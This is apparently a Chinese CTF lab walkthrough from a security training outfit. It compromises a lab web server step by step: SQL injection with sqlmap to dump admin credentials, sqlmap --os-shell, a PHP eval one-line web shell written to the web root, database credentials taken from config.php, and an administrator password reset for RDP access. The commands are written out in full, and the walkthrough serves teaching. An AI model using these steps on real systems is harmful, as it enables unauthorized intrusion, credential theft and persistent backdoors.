**文章来源：知了堂冯老师原创**

![v2-eec5e37af1e4a1b398d537a7c1e7acab_hd.j](https://pic4.zhimg.com/80/v2-eec5e37af1e4a1b398d537a7c1e7acab_hd.jpg)

  

 **知了堂禁卫安全实验室(冯万忠.GoDun.F-原创)**

0x00 介绍

接着上一篇，咱们继续。还是那句话，请大家任何工具使用均来自互联网，涉及到的技术仅用于教学，不得用于非法用途，请遵守国家安全法律法规，做一个正能量的安全人员，为国家安全奉献自己的绵薄之力。

0x01实战

![](http://www.zhiliaotang.net/uploads/allimg/191122/1-191122100624E0.png)

第一步：首先打开连接地址: http://202.0.0.207

![](http://www.zhiliaotang.net/uploads/allimg/191122/1-191122100F2Y3.png)

第二步：寻找漏洞点，点击页面的时候，我们看到是PHP的网站，以及url中的参数名为cid，那我们可以使用sql注入试试，看是否存在sql注入漏洞

![](http://www.zhiliaotang.net/uploads/allimg/191122/1-191122100IN18.png)

我们使用手工判断方法：

[
_http://202.0.0.207/product.php?cid=3_](http://202.0.0.207/product.php?cid=3)’，
页面异常

![](http://www.zhiliaotang.net/uploads/allimg/191122/1-191122100Q2J2.png)

http://202.0.0.207/product.php?cid=3 and 1=1，正常

![](http://www.zhiliaotang.net/uploads/allimg/191122/1-191122100T1637.png)

http://202.0.0.207/product.php?cid=3 and 1=2，异常

![](http://www.zhiliaotang.net/uploads/allimg/191122/1-191122100942514.png)

从而判断此处一定存在sql注入漏洞，且参数类型为整型。

这里我们可以使用盲注来手工注入。因为sqlmap也支持盲注类型，所有为了节约时间我们就使用sqlmap来脱库吧！

第二步：使用sqlmap来脱库

sqlmap -u http://202.0.0.207/product.php?cid=3

![](http://www.zhiliaotang.net/uploads/allimg/191122/1-191122101022564.png)

![](http://www.zhiliaotang.net/uploads/allimg/191122/1-19112210103OT.png)

此参数爆出时间盲注和联合注入攻击可以实现。

接下来我们直接开始跑库吧

sqlmap -u http://202.0.0.207/product.php?cid=3 –dbs

![](http://www.zhiliaotang.net/uploads/allimg/191122/1-19112210112KE.png)

![](http://www.zhiliaotang.net/uploads/allimg/191122/1-191122101301Y1.png)

我们选择510cms数据库来爆吧

sqlmap -u http://202.0.0.207/product.php?cid=3 -D 510cms –tables

![](http://www.zhiliaotang.net/uploads/allimg/191122/1-1911221014205b.png)

再来爆510_admin试试

sqlmap -u http://202.0.0.207/product.php?cid=3 -D 510cms -T 510_admin
--columns

![](http://www.zhiliaotang.net/uploads/allimg/191122/1-191122101555634.png)

接下来爆数据

sqlmap -u http://202.0.0.207/product.php?cid=3 -D 510cms -T 510_admin -C
id,mid,name,passwd,remark –dump

![](http://www.zhiliaotang.net/uploads/allimg/191122/1-191122101615O1.png)

然后我们想要admin用户的密码：8dbdf8221fcf4bd6ac5a48317baa948c，在线MD5解密后得到密码为adminlwphp

![](http://www.zhiliaotang.net/uploads/allimg/191122/1-191122101A5R4.png)

第三步：我们接下来就去找后台登录页面了

这里我使用御剑后台扫描器

![](http://www.zhiliaotang.net/uploads/allimg/191122/1-191122101P0623.png)

![](http://www.zhiliaotang.net/uploads/allimg/191122/1-191122101Q9C8.png)

首先我们还是看登录页面的源码，看是不是有flag，果然如此，在这里拿到一个flag3{d3eac3a68b7d3863cc7bd45ba948195d}

![](http://www.zhiliaotang.net/uploads/allimg/191122/1-191122101Z4505.png)

![](http://www.zhiliaotang.net/uploads/allimg/191122/1-191122101931945.png)

接下来我们使用爆库出来的管理员账户和密码登录：admin/ adminlwphp，登录成功

![](http://www.zhiliaotang.net/uploads/allimg/191122/1-19112210201L56.png)

第四步：胡乱捣腾

进入后台后，现在也只有到处去收集有用信息，看下有没有直接拿flag的地方了。一不小心，突然看到了网站绝对路径C:/www/,那根据前面爆出的sql注入漏洞，我们能不能拿到cmdshell呢？我们接下来尝试一下

sqlmap -u http://202.0.0.207/product.php?cid=3 --os-shell

![](http://www.zhiliaotang.net/uploads/allimg/191122/1-19112210210L11.png)

果然拿到了cmdshell，真XX是一个惊喜，那么我们接下就看下现在拥有的系统权限是什么

![](http://www.zhiliaotang.net/uploads/allimg/191122/1-191122102141411.png)

第五步：一句话木马上传及利用

接下来就直接写入一句话木马了

echo ^<?php @eval($_POST[pass]);?^>>C:/WWW/shell.php

![](http://www.zhiliaotang.net/uploads/allimg/191122/1-19112210220K46.png)

接下来我们上菜刀工具

![](http://www.zhiliaotang.net/uploads/allimg/191122/1-191122102234P3.png)

连接成功

![](http://www.zhiliaotang.net/uploads/allimg/191122/1-191122102AL44.png)

第六步：胡乱捣腾

下面看到这么多页面心头就开始发慌，又得漫山遍野的去收集flag了，

在网站根目录发现flag.php文件，发现flag1=flag1{6ab7c0c46b171d04f1cab922c2f9f017}

![](http://www.zhiliaotang.net/uploads/allimg/191122/1-191122102I0525.png)

花了10多分钟，再也没有找到flag，那只有想其他的办法了。在configs中找到config.php，这个是数据库的配置文件，我们得到了数据库连接的账户root密码为windpasssql

![](http://www.zhiliaotang.net/uploads/allimg/191122/1-191122102925558.png)

我们使用菜刀对数据库进行连接

![](http://www.zhiliaotang.net/uploads/allimg/191122/1-191122102945119.png)

提交后，连接成功

![](http://www.zhiliaotang.net/uploads/allimg/191122/1-191122103011b9.png)

继续看这里有没有flag，又拿到一个flag=flag2{981c05134c56092b83b3e9c9b4116ac1}

![](http://www.zhiliaotang.net/uploads/allimg/191122/1-19112210304R49.png)

我们使用菜刀工具进入虚拟终端，看下目前的权限是什么，需要提权不？结果发现是system权限，

![](http://www.zhiliaotang.net/uploads/allimg/191122/1-19112210311A39.png)

执行命令netstat -an查看3389端口已经开启

![](http://www.zhiliaotang.net/uploads/allimg/191122/1-191122103136447.png)

et user administrator godun.f

修改管理员密码为godun.f，

![](http://www.zhiliaotang.net/uploads/allimg/191122/1-191122103159143.png)

然后远程桌面登录远程主机

![](http://www.zhiliaotang.net/uploads/allimg/191122/1-191122103521A1.png)

![](http://www.zhiliaotang.net/uploads/allimg/191122/1-191122103541926.png)

拿到flag=flag4{e97950cb2dea110c53cb599abc826268}

拿到了4个flag，还有一个不知道藏在哪里，我们还得继续找，找了半天，最后在，C盘的根目录下找到了flag5{c3bc1e7b8325d75816e1ca8ae5ae72ad}

![](http://www.zhiliaotang.net/uploads/allimg/191122/1-191122103613934.png)

最后，到此为止，5个flag全部找出来了，接下来我们把5个flag放入答题框

本次打靶成功结束，希望能够给大家一点思路！！！

本系列持续更新中，欢迎关注！有问题也可以加知了小姐姐微信噢！ChilFun-Y

![](http://www.zhiliaotang.net/uploads/allimg/191122/1-191122103645360.png)

信安干货，请关注专栏：<https://zhuanlan.zhihu.com/c_1142392164838404096>

